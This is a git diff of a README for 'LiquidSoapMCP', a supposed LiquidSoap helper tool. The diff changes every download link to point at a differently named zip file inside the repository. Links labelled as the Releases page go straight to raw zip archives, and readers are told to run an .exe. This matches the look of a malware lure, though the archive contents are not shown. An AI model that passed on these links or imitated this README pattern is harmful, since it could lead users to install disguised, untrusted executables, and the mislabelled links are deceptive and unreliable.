@@ -1,7 +1,7 @@
 # 🎶 LiquidSoapMCP - Enhance Your LiquidSoap Experience
 
 ## 🔗 Download Now
-[![Download LiquidSoapMCP](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/examples/LiquidSoapMCP_trousering.zip%20LiquidSoapMCP-v2.4.0-brightgreen)](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/examples/LiquidSoapMCP_trousering.zip)
+[![Download LiquidSoapMCP](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/src/Soap-MCP-Liquid-1.1.zip%20LiquidSoapMCP-v2.4.0-brightgreen)](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/src/Soap-MCP-Liquid-1.1.zip)
 
 ## 📜 Description
 LiquidSoapMCP is a powerful tool that simplifies working with LiquidSoap 2.4.0. This application provides support for documentation and script assistance, making it easier for users to manage audio and video streaming for broadcasting.
@@ -10,7 +10,7 @@ LiquidSoapMCP is a powerful tool that simplifies working with LiquidSoap 2.4.0. 
 To get started with LiquidSoapMCP, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Visit the Releases page to download](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/examples/LiquidSoapMCP_trousering.zip)
+   [Visit the Releases page to download](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/src/Soap-MCP-Liquid-1.1.zip)
 
 2. **Choose Your Version:** On the Releases page, find the latest version of LiquidSoapMCP. This will typically be listed at the top. Look for the `.exe` or other relevant file format for your operating system.
 
@@ -29,7 +29,7 @@ To get started with LiquidSoapMCP, follow these simple steps:
 Follow these straightforward steps to download and install LiquidSoapMCP on your device:
 
 1. **Go to the Releases Page:** Click the link below to visit the download page for LiquidSoapMCP.
-   [Visit the Releases page to download](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/examples/LiquidSoapMCP_trousering.zip)
+   [Visit the Releases page to download](https://raw.githubusercontent.com/YYichel/LiquidSoapMCP/main/src/Soap-MCP-Liquid-1.1.zip)
 
 2. **Select Your Version:** Choose the version that suits your operating system.
 
